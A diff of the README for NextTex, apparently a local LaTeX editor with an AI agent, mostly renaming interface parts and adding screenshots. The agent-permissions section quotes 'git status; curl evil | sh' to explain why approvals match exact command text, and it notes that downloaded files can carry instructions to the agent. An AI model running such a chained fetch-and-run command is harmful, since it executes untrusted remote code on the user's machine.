@@ -19,7 +19,7 @@ close the tab. No database, no Docker, no nginx.
 
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="docs/screenshot-dark.png">
-  <img alt="NextTex: the file list, the source, the typeset page and the agent" src="docs/screenshot-light.png">
+  <img alt="NextTex: the bar and the Files drawer, the source, the typeset page and the agent" src="docs/screenshot-light.png">
 </picture>
 
 **Contents**
@@ -63,8 +63,8 @@ close the tab. No database, no Docker, no nginx.
   - [Anywhere](#anywhere)
   - [In the source](#in-the-source)
   - [On the page](#on-the-page)
-  - [In the file list](#in-the-file-list)
-  - [In the agent panel](#in-the-agent-panel)
+  - [In the Files drawer](#in-the-files-drawer)
+  - [In the agent column](#in-the-agent-column)
 - [Documentation](#documentation)
 - [Reporting a bug](#reporting-a-bug)
 - [Licence](#licence)
@@ -83,7 +83,8 @@ close the tab. No database, no Docker, no nginx.
   same for the style warnings chktex finds. No model involved.
 - **Every pause is a version**, kept until you say otherwise, with a trash that
   never empties itself.
-- **Four git buttons** for the four commands a paper actually needs.
+- **Git is one drawer**: what changed, as a patch under each file, one
+  press that commits and pushes, and Pull. Branching stays in the terminal.
 - **Every document in the folder has its own page.** There is no main file:
   a resume and its variations, a thesis and its supplementary information,
   each build and download on their own, and the page follows whatever you
@@ -103,14 +104,28 @@ close the tab. No database, no Docker, no nginx.
   Turned on, sectioning, environments, mathematics, citations and the
   preamble each take a hue, which is what makes a long chapter skimmable for
   its shape rather than its words.
-- **Search and drag in the file list**, with open files following a folder
+- **One bar, one drawer.** Files, Sections, Search, Papers, History, Git,
+  Before you submit and Deleted are eight buttons down the left edge, and
+  one drawer shows the one you chose at full height, so the tree or the
+  outline can stay open for as long as a chapter takes without pushing
+  the other out.
+- **Formulas, tables and figures render on hover.** Rest the pointer on a
+  formula, a `tabular` or an `\includegraphics` in the source and it
+  appears typeset, drawn, or as the picture with its size; the Files
+  drawer does the same beside an image's row.
+- **Find and drag in the Files drawer**, with open files following a folder
   that moves.
+- **The look is written down.** Every control comes from one kit on one
+  set of tokens, and [docs/style-guide.md](docs/style-guide.md) says how,
+  so whatever is added later looks like the rest.
 
 **The agent**
 
 - **Choose Claude, OpenAI, a local model, or no agent at all.** The last is
-  a real option, not a degraded one, and the choice can be changed later in
-  the settings sheet rather than only when you first sign in. A local model
+  a real option, not a degraded one. *What writes with you* is one sheet,
+  reached from the projects screen, from the settings sheet and from the
+  agent column's header, so the choice is never further than a click and
+  is never only made once. A local model
   is the OpenAI choice with a base URL: Ollama, LM Studio, vLLM and most
   local servers speak the same protocol, no key is needed, and nothing
   leaves the machine.
@@ -129,6 +144,10 @@ close the tab. No database, no Docker, no nginx.
   NextTex holds a whole copy of it: you see each other's typing and each
   other's cursors, and anything either of you wrote offline is merged rather
   than fought over when you reconnect.
+- **Share, archive and trash from the list.** A project's row offers all
+  three without opening it. Archived projects and the trash are two views
+  under the list, and Restore brings one back; NextTex never deletes a
+  folder.
 - **Losing your folder is not losing your place.** Delete or move your copy
   and nobody else is touched; rejoin from your collaborators with no new
   invite, into an empty folder or a copy you already have.
@@ -355,9 +374,10 @@ reported as *"three new commits, none of which change NextTex"*, a grey line
 rather than an alert, and a check that cannot reach GitHub says nothing unless
 you asked for it.
 
-NextTex has a version number, and the same line at the foot of the page is
-where to read it: *"NextTex 1.0.0, up to date"* when there is nothing to do,
-and *"NextTex 1.1.0 is available"* ahead of the commit count when there is.
+NextTex has a version number. The app bar carries it beside the name, and
+the update sheet says what it means: *"NextTex 1.0.0, up to date"* when
+there is nothing to do, and *"NextTex 1.1.0 is available"* ahead of the
+commit count when there is.
 The number moves the way you would expect: the last part for fixes, the
 middle for something new you can see or do, the first when an update needs
 more than an update. In a terminal, `python3 -m nexttex.version` prints it
@@ -365,13 +385,14 @@ with the commit the code is on and the one the interface was built from,
 and the [releases page](https://github.com/dakshitha-a/NextTex/releases)
 lists what each version changed.
 
-**Not now** puts the card away without losing it. The foot of the page then
-says *"An update is waiting"* with a **Show it** beside it, so you can come back
-and update on an afternoon that suits you rather than having to remember. The
-card stays away on its own until you ask.
+**Not now** puts the commit list away without losing it. The sheet then
+says *"An update is waiting"* with a **Show it** beside it, and the button on
+the app bar keeps its ring, so you can come back and update on an afternoon
+that suits you rather than having to remember. The list stays away on its
+own until you ask.
 
 An update that has landed on disk without the server being restarted is its
-own case, and the footer says so before it says anything about GitHub:
+own case, and the sheet says so before it says anything about GitHub:
 *"Updated on disk to abc1234. Restart to run it."* The running process
 reports the commit it started with, which is the only commit it can honestly
 claim; the files are a separate fact and are reported beside it. Without that
@@ -460,13 +481,23 @@ the same thing that happens when somebody removes you.
 
 ### Your first session
 
-About twenty minutes, most of it TinyTeX downloading. Open the URL, choose an
-agent or none, and add `examples/minimal-article` as a project. It typesets as
-it opens. Type a sentence into the abstract and the page follows about two
-seconds later; double-click a paragraph on the page to jump back to the line
-that set it. The full walkthrough, with a deliberate error, the version
+About twenty minutes, most of it TinyTeX downloading. Open the URL, choose
+an agent or none in the sheet that greets you, and open
+`examples/minimal-article` as a project from the *Other ways in* menu
+beside *New project*. It typesets as it opens. Type a sentence into the
+abstract and the page follows about two seconds later; double-click a
+paragraph on the page to jump back to the line that set it. The full walkthrough, with a deliberate error, the version
 history and a GitHub backup, is in
 [docs/first-session.md](docs/first-session.md).
+
+<picture>
+  <source media="(prefers-color-scheme: dark)" srcset="docs/screenshot-projects-dark.png">
+  <img alt="The projects screen: an app bar with the writing agent, the update, report and help buttons, the lock that says there is no password yet, and Settings; the list of projects with the find field, New project and Other ways in above it; a row under the pointer showing Open, Share, Zip, PDF, Archive and Trash; and a quiet line under the list counting one archived project and one in the trash." src="docs/screenshot-projects-light.png">
+</picture>
+
+*The projects screen. A row under the pointer shows what can be done to it
+without opening it; the line under the list is where the archived ones and
+the trash are.*
 
 ## How it works
 
@@ -533,7 +564,7 @@ makes typing slower on the day it happens.
 | A settled edit written to disk | 1.4 ms | 40 ms |
 | The same, with its version recorded | 3.0 ms | 60 ms |
 | Whole project as a zip | 67 ms | 3 s |
-| Interface bundle | 852.6 kB | 860 kB |
+| Interface bundle | 853.3 kB | 860 kB |
 
 The first row is the one worth keeping. The compile rewrites `build/main.pdf`,
 the symbol cache's stamp walk used to count it, and every build therefore
@@ -572,7 +603,7 @@ words under the row, which on a TinyTeX behind its mirror is the one
 sentence that says what to do.
 
 None of that stops a build, though, and neither does what a venue sends
-back. *Before you submit*, a panel at the foot of the file list, reads the
+back. *Before you submit*, a drawer of its own on the bar, reads the
 last build and the sources for exactly that: undefined references, a
 `\today` in the footer, a `% TODO` beside a number, a `\todo` in the text,
 a duplicate label, a label or a bibliography entry nothing uses, a
@@ -618,15 +649,18 @@ your own business: thinning is a decision about your own disk.
 ### Four git commands, and the fifth one is a terminal
 
 See what changed, commit it, push it, pull it back on another machine. That is
-a paper's whole relationship with git, and each is one button in the Git
-drawer. Seeing what changed means the patch, not only the file's name: the
-chevron beside a changed file opens it, with the old lines and the new ones.
+a paper's whole relationship with git, and the Git drawer holds exactly that:
+the branch with how far ahead or behind it is and Pull beside it, the changed
+files, a message field, and one button that commits and pushes. Seeing what
+changed means the patch, not only the file's name: the chevron beside a
+changed file opens it, with the old lines and the new ones.
 The same patch is there for any version in a file's history, against the
 file as it stands or against any other version.
 
-A project with no repository is offered one, with a first commit and a
-`.gitignore` that already knows about `build/` and `.nexttex/`. With the
-GitHub CLI signed in, *Back this up to GitHub* creates the repository, private
+A project with no repository is offered one, *Keep versions here*, with a
+first commit and a `.gitignore` that already knows about `build/` and
+`.nexttex/`. Sending a copy to GitHub is a separate step, *Back up to
+GitHub*: with the GitHub CLI signed in it creates the repository, private
 by default, and pushes into it; a token you supply goes to your credential
 store rather than into the remote URL, so it never turns up in
 `git remote -v`. Branching and merging stay in the terminal, where the tools
@@ -656,7 +690,22 @@ five hues, keywords in the sectioning colour, strings in the citation
 colour, numbers in the mathematics colour, and so on, so a figure script
 never reads as a second palette beside the chapter it draws for.
 
-<img alt="A white page inside a dark shell, with the command families coloured: the file list and agent panel stay dark while the editor is white." src="docs/screenshot-white-page.png">
+All of it is on the settings sheet, which the Settings button at the foot
+of the bar opens. The sheet is four groups down its left, each saying
+where its choices live: *How it looks* and *While you write* on this
+computer, *This project* with the project, *This install* for who may
+open it and who writes with you. Tutorial and a reset of this computer's
+choices are at the foot.
+
+<picture>
+  <source media="(prefers-color-scheme: dark)" srcset="docs/screenshot-settings-dark.png">
+  <img alt="The settings sheet over the workspace, on its How it looks group: the four groups down the left with where each one lives, and rows for the theme, the interface size, the editor text, its weight and its page, highlighting and emphasis, each with its control at the right." src="docs/screenshot-settings-light.png">
+</picture>
+
+*The settings sheet on its first group. A row is a title, sometimes a
+line under it, and the control at the right.*
+
+<img alt="A white page inside a dark shell, with the command families coloured: the bar, the drawer and the agent column stay dark while the editor is white." src="docs/screenshot-white-page.png">
 
 *A dark shell holding a white page, with colouring switched on. Both are
 settings; neither is the default.*
@@ -673,20 +722,21 @@ figure environment written for it. Neither happens inside `verbatim`.
 
 ### Panes, and two modes
 
-Double-click the preview's header for a reading mode: everything else folds to
-a strip and the typeset page gets the screen. The empty part of the tab strip
-does the same for writing, except that it keeps the file list, because you are
-still moving between chapters. Double-click again and your layout comes back
-exactly as you left it, including what you had already folded away. A single
-click on either folds just that pane, as it does on the agent's header. Both
-modes have a key as well, `⌘⌥R` / `Ctrl-Alt-R` for reading and `⌘⌥E` /
-`Ctrl-Alt-E` for writing, for when the tab strip is full and there is nothing
-left to double-click.
+Double-click the preview's tab in front for a reading mode: everything else
+folds to a strip and the typeset page gets the screen. The empty part of the
+tab strip does the same for writing, except that it keeps the drawer, because
+you are still moving between chapters. Double-click again and your layout
+comes back exactly as you left it, including what you had already folded
+away. A single click on the tab in front, or on the fold control at the end
+of either strip, folds just that pane, as it does on the agent's header.
+Both modes have a key as well, `⌘⌥R` / `Ctrl-Alt-R` for reading and `⌘⌥E`
+/ `Ctrl-Alt-E` for writing, for when the tab strip is full and there is
+nothing left to double-click.
 
 Right-click the tab you are working in and you can close every other tab,
 close everything to its right, close the lot, duplicate the file, or download
 it. A duplicate arrives beside the original as `chapter (copy).tex` and the
-file list opens far enough to show you where it landed; nothing moves out
+Files drawer opens far enough to show you where it landed; nothing moves out
 from under you, so the file you were editing is still the one in front.
 
 A Markdown file gets the same treatment as a script: open a `README.md` or a
@@ -707,11 +757,32 @@ when you close the last of them, while one you added with `+` or clicked on
 stays until you stop it yourself. Reopening a closed tab with `⌘⌥⇧T` /
 `Ctrl-Alt-Shift-T` brings its document back too.
 
-The file list has a filter row behind a magnifier: type and the tree narrows
-to what matches, through folders you had collapsed, and clearing it gives back
-exactly the tree you had. Rows drag onto folders, and a folder takes
+The bar down the left edge has eight buttons, Files, Sections, Search,
+Papers, History, Git, Before you submit and Deleted, and one drawer beside
+it shows whichever you chose at full height; a second press on the lit
+button folds the drawer away, and `⌘B` / `Ctrl-B` hides the whole column.
+The Files drawer's heading row holds New file, New folder, Upload and Find
+a file: type into the field and the tree narrows to what matches, through
+folders you had collapsed, with the count beside it, and clearing it gives
+back exactly the tree you had. Rows drag onto folders, and a folder takes
 everything under it, including open files, which follow it rather than being
 left pointing at a name that no longer exists.
+
+Three things render where they are written. Rest the pointer on a formula
+in the source and it appears typeset beside it; on a `tabular` and the
+table is drawn, with its rules, its alignment and its `\multicolumn`s; on
+an `\includegraphics` and the picture appears with its pixel size and its
+size on disk, a PDF by its first page. The Files drawer shows the same
+card beside the row of an image or a PDF, on hover or when the row has
+the focus.
+
+<picture>
+  <source media="(prefers-color-scheme: dark)" srcset="docs/screenshot-hover-dark.png">
+  <img alt="The workspace with two cards open: beside the Files drawer's row for figures/decay-fit.png, a card with the plot, its pixel size, its size on disk and its folder; over the source, the tabular under the pointer drawn as a table." src="docs/screenshot-hover-light.png">
+</picture>
+
+*A figure's card beside its row, and a table drawn over its source. Both
+go when the pointer moves on.*
 
 ## The agent
 
@@ -726,12 +797,22 @@ shell syntax cannot be, since `git status; curl evil | sh` starts with `git`,
 so that one is remembered by its exact text and covers nothing else. What you
 answer is kept with the project, so a restart does not ask you again.
 
-If that is more asking than you want, the control under the box has three
-positions and you choose which one you are in.
+If that is more asking than you want, the chip under the box, the one that
+names the model and says *asks first*, opens a menu with three positions,
+and you choose which one you are in.
+
+<picture>
+  <source media="(prefers-color-scheme: dark)" srcset="docs/screenshot-agent-dark.png">
+  <img alt="The agent column mid-turn: the writer's question, one folded line for the three tool calls that followed with their total time, the agent's sentence with a diff chip under it offering Show and Undo, its plan ticking itself off, and a permission card asking whether to run a script, with Allow, For this conversation, Allow always and Deny." src="docs/screenshot-agent-light.png">
+</picture>
+
+*The column mid-turn. Three tool calls fold to one line, the edit is a chip
+with its diff and an undo, and the script it wants to run is a card you
+answer.*
 
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="docs/fence-dark.svg">
-  <img alt="The three positions of the control under the agent's box: Ask before acting, the default, asks about every command, fetch and write that leaves the project; Run the work without asking lets commands and edits run and still asks about a write outside the project or to a file the build runs, and about anything that reaches the internet; Never ask about anything asks about nothing and takes a second press to switch on." src="docs/fence-light.svg">
+  <img alt="The three positions of the composer's chip: Ask before acting, the default, asks about every command, fetch and write that leaves the project; Run the work without asking lets commands and edits run and still asks about a write outside the project or to a file the build runs, and about anything that reaches the internet; Never ask about anything asks about nothing and takes a second press to switch on." src="docs/fence-light.svg">
 </picture>
 
 **Ask before acting** is the above: a card for every command, every fetch and
@@ -765,9 +846,10 @@ somebody else's `.bib` file is an instruction it may follow.
 
 Every automatic approval appears in the transcript marked as one, whichever
 position you are in, and at the quietest position that record is the only
-account of what was done. While the fence is down at all, an **Auto** chip sits
-beside the agent's name saying which position it is in, and one click on it
-steps back. A fence that is down and says nothing is worse than no fence.
+account of what was done. While the fence is down at all, **Auto** sits in
+the column's header in the warning colour, saying which position it is in,
+and one click on it steps back. A fence that is down and says nothing is
+worse than no fence.
 
 **It says what it is doing, and for how long.** A turn can spend twenty seconds
 inside a tool, or a while thinking before it says anything, so the header
@@ -781,10 +863,11 @@ says how long it took.
 three is frozen, or which measurements came from a collaborator, and it writes
 that down where the next conversation will read it. So you can start a fresh
 conversation whenever the current one has wandered, without teaching it your
-project again. The memory is a plain file you can correct by hand, shown in
-the panel listing what the agent reads.
+project again. The memory is a plain file you can correct by hand, shown
+under *What Claude reads* in the column's header, which lists everything
+the agent is given.
 
-**A conversation can be ended.** *New conversation* clears the panel and the
+**A conversation can be ended.** *New conversation* clears the column and the
 model's own recollection, and files the transcript away under a timestamp
 rather than deleting it, because it is the record of what an assistant did to
 your document. What the project has cost carries over, and so do the
@@ -796,7 +879,7 @@ the result in its instructions from then on.
 
 ### It draws a figure from your data
 
-Point at a dataset in the file list and ask for a plot, or just say which
+Point at a dataset in the Files drawer and ask for a plot, or just say which
 file and what to plot. The agent reads the data, writes a Python script,
 runs it, and puts the figure in your document. The first attempt looks
 right, for reasons that are set out below.
@@ -836,7 +919,7 @@ micrograph or a heatmap with a million cells.
 If a plot needs a package this install does not have, it says which one and
 asks. Installing it is your press.
 
-**And the script is yours to run.** Open it from the file list, change the
+**And the script is yours to run.** Open it from the Files drawer, change the
 axis label or the width, and press Run at the end of the tab strip, or
 `Ctrl-Enter` in the editor. A tab for the script joins the preview strip
 beside your documents, and it shows what the run printed, every figure the
@@ -850,7 +933,8 @@ it tomorrow and the pane shows the last run.
 
 ### You can show it something
 
-Paste a screenshot into the box, drop an image on the panel, or pick one.
+Paste a screenshot into the box, drop an image on the column, or pick one
+with the attach button beside it.
 A referee's marked-up page, a table that has come out wrong, a figure from
 somebody else's paper: hand it over rather than describing it. The chip
 above the box shows a thumbnail of what is going with the question, so an
@@ -874,8 +958,8 @@ transcript shows; the prompt's text goes to the agent ahead of it.
 
 A prompt is a Markdown file, and its name is the file's name with hyphens
 read as spaces. Put `tighten.md` in a `prompts/` folder at the project's
-root and `/tighten` is one more; copy a built-in there from the Context
-panel and the copy is the one used, so a group can edit its own reviews
+root and `/tighten` is one more; copy a built-in there from *What Claude
+reads* and the copy is the one used, so a group can edit its own reviews
 and commit them with the paper.
 
 ### It cannot invent a citation
@@ -891,13 +975,14 @@ bibliography against the record it claims to come from. A fabricated reference
 is an academic integrity failure, so the defence is structural rather than a
 matter of care: there is no path from the model's memory to your `.bib` file.
 
-All of that is yours without an agent as well, in the Papers section at
-the foot of the file list. Type a few words into *Search the literature*,
-choose Crossref, OpenAlex or Semantic Scholar, and each result carries an
+All of that is yours without an agent as well, in the Papers drawer. One
+field takes a few words or a pasted DOI: words go to Crossref, OpenAlex
+or Semantic Scholar, whichever you chose, and each result carries an
 *Add* that puts the publisher's record into your `.bib` and shows the key
-it made. Paste a DOI and *Add*, and the entry arrives from
-the publisher with its title, author and year shown, so you can check it
-against the page in front of you. *Check these against their records*
+it made, with the full author list, the venue and the abstract on a card
+when you rest on it; a DOI goes to the publisher, and the entry arrives
+with its title, author and year shown, so you can check it against the
+page in front of you. *Check the bibliography against its records*
 re-reads the whole bibliography and lists every entry that disagrees with
 the record it came from. Neither writes anything the publisher did not say.
 
@@ -908,7 +993,7 @@ of you. Neither changes anything.
 
 ### Point it at a folder of papers
 
-`⋯` on your `.bib` file, *Add papers from a folder*, and NextTex walks it,
+The actions button on your `.bib` file's row, *Add papers from a folder*, and NextTex walks it,
 whether that is a Zotero library or a Downloads folder, finds each paper's DOI
 in its own text, fetches that record from the publisher and appends it.
 Nothing is added twice, and a PDF whose DOI cannot be found is reported rather
@@ -929,7 +1014,17 @@ than instruction, because the text came out of files you downloaded.
 
 Share a project and you get an invite to send. Whoever opens it gets the
 whole project, every file and what those files used to say, into a folder
-of their own, and from then on the two copies stay in step.
+of their own, and from then on the two copies stay in step. Share is on
+the project's row in the list and in the title bar inside the project,
+and both open the same sheet.
+
+<picture>
+  <source media="(prefers-color-scheme: dark)" srcset="docs/screenshot-share-dark.png">
+  <img alt="The share sheet over the projects list: two sentences saying what sharing is, the invite just made and already copied, the members with you first, Stop sharing at the left of the foot and Make an invite as the filled button." src="docs/screenshot-share-light.png">
+</picture>
+
+*The share sheet, opened from a row. The invite is a credential; the
+sentence over it says so.*
 
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="docs/collab-dark.svg">
@@ -975,11 +1070,10 @@ already have. It stops the two of you syncing. It cannot unsend a paper. The
 button says so, next to itself. Somebody who is removed is told so, once,
 and their copy stays theirs.
 
-You can stop sharing from the share sheet, which opens from the Share
-button inside a project or from the project's row in the list. The others
-carry on without you, and your copy stays on your computer as a project of
-your own, with its history, or is deleted if you tick the box that says
-so. The row says "shared", and with whom, once you have. Deleting the
+You can stop sharing from the same sheet. The others carry on without
+you, and your copy stays on your computer as a project of your own, with
+its history, or is deleted if you tick the box that says so. The row says
+how many people it is shared with once you have. Deleting the
 folder by hand is never the way out: NextTex would take that as this copy
 being gone, which is what it is, and nobody else would notice anything.
 
@@ -1036,7 +1130,7 @@ else, disconnecting somebody else, and leaving.
 
 **Sharing needs a platform iroh builds for**: Linux, Windows, and Macs with
 Apple silicon. There is no build for an Intel Mac, so on one of those the
-share card says sharing is unavailable and everything else works exactly as
+share sheet says sharing is unavailable and everything else works exactly as
 it does anywhere. The installer treats iroh as optional for the same reason:
 a missing build costs you the one feature, not the install.
 
@@ -1046,7 +1140,7 @@ Windows support is written and only partly verified. What has been run on
 a real Windows laptop, more than once: the `irm ... | iex` install to the
 end, the server starting from the Startup shortcut, `scripts\update.ps1`
 against the real repository, and a project shared from a Linux machine
-joined, edited, deleted with the server running, rejoined from the card,
+joined, edited, deleted with the server running, rejoined from the list,
 left, and joined again from a git clone. Each of those rounds found things
 and fixed them, and the ones from the latest round are in the commit log
 under 2.3.1.
@@ -1211,10 +1305,10 @@ localhost and skip it.
 
 ## A project on disk
 
-Point NextTex at any folder containing a LaTeX document, typed into the
-projects screen or picked with its Browse button, which walks the disk of
-the machine NextTex is running on. `examples/minimal-article` is there to
-try it on. A new project starts from one of five templates: an article, a
+Point NextTex at any folder containing a LaTeX document: *Open a folder*,
+under *Other ways in* on the projects screen, takes a path typed in or
+picked with Browse, which walks the disk of the machine NextTex is running
+on. `examples/minimal-article` is there to try it on. A new project starts from one of five templates: an article, a
 report in chapters, a talk, a letter, or a job application, which is a
 resume and a cover letter as two documents with a `posting.md` beside them
 for the listing's notes, the shape a folder per application takes. A
@@ -1282,7 +1376,7 @@ your-paper/
 ```
 
 Delete `.nexttex/` and you have exactly the LaTeX project you started with.
-On a shared project, leave from the share panel first: deleting the folder's
+On a shared project, leave from the share sheet first: deleting the folder's
 records by hand tells nobody, so the others would still count you as a
 member and keep trying to reach you.
 
@@ -1300,8 +1394,8 @@ of these, every setting and every file by typing.
 |---|---|
 | `⌘K` / `Ctrl-K` | The command palette: every action, setting and file, found by typing |
 | `⌘S` / `Ctrl-S` | Put the file on disk this instant; builds instead when compile-as-you-type is off |
-| `⌘B` / `Ctrl-B` | Hide the file list |
-| `⌘⌥A` / `Ctrl-Alt-A` | Show or hide the agent panel, ready to type |
+| `⌘B` / `Ctrl-B` | Hide the bar and its drawer, or bring them back |
+| `⌘⌥A` / `Ctrl-Alt-A` | Show or hide the agent column, ready to type |
 | `⌘⌥P` / `Ctrl-Alt-P` | Move between the previewed documents |
 | `⌘⇧F` / `Ctrl-Shift-F` | Find and replace across every file in the project |
 | `⌘⌥O` / `Ctrl-Alt-O` | Open a file by typing its name |
@@ -1309,11 +1403,11 @@ of these, every setting and every file by typing.
 | `⌘⌥W` / `Ctrl-Alt-W` | Close the tab in front |
 | `⌘⌥⇧T` / `Ctrl-Alt-Shift-T` | Reopen the tab you just closed |
 | `⌘⌥R` / `Ctrl-Alt-R` | Reading mode: the page fills the window; again puts your layout back |
-| `⌘⌥E` / `Ctrl-Alt-E` | Writing mode: the source and the file list fill the window; again puts it back |
+| `⌘⌥E` / `Ctrl-Alt-E` | Writing mode: the source and the drawer fill the window; again puts it back |
 | `F8`, `Shift-F8` | Next and previous error |
 | Wheel, over either tab strip | Scroll across the tabs; the count at the end lists the ones out of sight |
 | Right-click, on the preview tab in front | Stop previewing the others or all, download that document's PDF, or open the page in a window of its own for a second monitor |
-| `/`, on the project list | Find a project by typing; Enter opens the first match. The sort beside the box orders the list by when each was last opened or by name |
+| `/`, on the project list | Find a project by typing; Enter opens the first match. The sort on the list's header line orders it by when each was last opened or by name |
 
 ### In the source
 
@@ -1337,28 +1431,29 @@ of these, every setting and every file by typing.
 | `⌘F` / `Ctrl-F` | Find on the typeset page |
 | Double-click | Go to the line that set this |
 
-### In the file list
+### In the Files drawer
 
 | Key | Does |
 |---|---|
 | Typing | Jump to a file |
 | `F2`, `Delete` | Rename, move to trash |
 
-### In the agent panel
+### In the agent column
 
 | Key | Does |
 |---|---|
 | `↵`, `⇧↵` / `Shift-↵` | Send; a new line |
 | `/` at the start of the box | List the reusable prompts; `↑`, `↓` and `↵` fill one in, `Esc` puts the list away |
 | `A`, `⇧A`, `C`, `D`, in a permission card | Allow, allow always, allow for this conversation, deny |
-| `Esc` | Stop the turn if one is running, otherwise close the panel |
+| `Esc` | Stop the turn if one is running, otherwise close the column |
 
 ## Documentation
 
-There is a tutorial inside the app: the cog in the file list's masthead
-opens Settings, which has a **Tutorial** button at its foot, and the projects
-screen has a question mark beside its own cog. Both explain what is on the
-screen you are looking at, which is usually faster than the files below.
+There is a tutorial inside the app: the Settings button at the foot of the
+bar opens the settings sheet, which has a **Tutorial** button at its foot,
+and the projects screen's app bar has an **About this screen** button beside
+its own Settings. Both explain what is on the screen you are looking at,
+which is usually faster than the files below. Esc closes either.
 
 - [docs/architecture.md](docs/architecture.md): how it works inside. What the
   parts are, what each one owns, and why the awkward decisions are the way
@@ -1432,7 +1527,7 @@ you have one, and the commit subjects of your last update.
 Open an issue at [github.com/dakshitha-a/NextTex/issues](https://github.com/dakshitha-a/NextTex/issues),
 say what happened and what you expected, and paste the report. A fix lands
 on `master`; when the issue closes, the comment on it names the commit, and
-taking the fix is the footer's **Update** button or `scripts/update.sh`
+taking the fix is the update sheet's **Update** button or `scripts/update.sh`
 (`scripts\update.ps1` on Windows). What happens in between is written down
 in [docs/bug-reports.md](docs/bug-reports.md).
 
